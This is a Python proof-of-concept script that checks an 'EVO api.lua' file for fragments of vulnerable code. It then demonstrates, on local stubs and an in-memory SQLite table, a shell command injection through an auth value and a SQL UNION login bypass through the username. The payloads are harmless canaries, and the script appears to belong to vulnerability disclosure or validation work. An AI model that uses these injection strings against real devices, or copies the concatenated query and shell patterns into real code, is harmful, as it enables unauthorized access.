#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
from pathlib import Path
import sqlite3
import subprocess
import tempfile


def validate_shell_construction():
    with tempfile.TemporaryDirectory() as directory:
        root = Path(directory)
        stub = root / "xwsses.cgi"
        marker = root / "canary"
        stub.write_text('#!/bin/sh\nprintf \'({"e":1})\'\n')
        stub.chmod(0o755)
        auth = f'invalid"; printf EVO_API_CANARY > {marker}; #'
        command = f'{stub} "?op=4&sses={auth}"'
        completed = subprocess.run(
            command,
            shell=True,
            executable="/bin/sh",
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
        return {
            "validated": marker.read_text() == "EVO_API_CANARY" if marker.exists() else False,
            "model": "Exact EVO api.lua auth concatenation with a local xwsses.cgi stub",
            "injected_auth": auth,
            "command": command,
            "returncode": completed.returncode,
        }


def validate_sql_construction():
    password = "PoC-only-password"
    password_md5 = hashlib.md5(password.encode()).hexdigest()
    username = f"' UNION SELECT 1, '{password_md5}', 0, 1 -- "
    query = "SELECT UID, UPASS, UENDATE, UENAB FROM user WHERE UNAME='" + username + "'"
    db = sqlite3.connect(":memory:")
    db.execute(
        "CREATE TABLE user (UID INTEGER, UPASS TEXT, UENDATE INTEGER, UENAB INTEGER, UNAME TEXT)"
    )
    db.execute(
        "INSERT INTO user VALUES (1, ?, 0, 1, 'Admin')",
        (hashlib.md5(b"Admin").hexdigest(),),
    )
    db.execute(
        "INSERT INTO user VALUES (2, ?, 0, 1, 'other')",
        (hashlib.md5(b"unrelated").hexdigest(),),
    )
    row = db.execute(query).fetchone()
    db.close()
    return {
        "validated": row is not None
        and row[0] == 1
        and row[1] == password_md5
        and row[2] == 0
        and row[3] == 1,
        "model": "Exact EVO api.lua username concatenation against an in-memory SQLite user table",
        "injected_username": username,
        "query": query,
        "returned_uid": row[0] if row else None,
        "password_hash_matches": row is not None and row[1] == password_md5,
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("api_lua", type=Path)
    parser.add_argument("--json", type=Path)
    args = parser.parse_args()
    api = args.api_lua.read_bytes()
    source = api.decode("utf-8")
    required = [
        "io.popen('/opt/xweb/www/cgi-bin/xwsses.cgi",
        "SELECT UID, UPASS, UENDATE, UENAB FROM user WHERE UNAME=",
        "elseif action == 'devices_list' then",
    ]
    for text in required:
        if text not in source:
            raise SystemExit(f"Required EVO source fragment not found: {text}")
    result = {
        "api_lua": str(args.api_lua),
        "sha256": hashlib.sha256(api).hexdigest(),
        "scope": "Local models only; no network request or device interaction",
        "shell_command_injection": validate_shell_construction(),
        "sql_authentication_bypass": validate_sql_construction(),
    }
    output = json.dumps(result, indent=2) + "\n"
    if args.json:
        args.json.parent.mkdir(parents=True, exist_ok=True)
        args.json.write_text(output)
    print(output, end="")
    if not all(
        result[name]["validated"]
        for name in ("shell_command_injection", "sql_authentication_bypass")
    ):
        raise SystemExit(1)


if __name__ == "__main__":
    main()
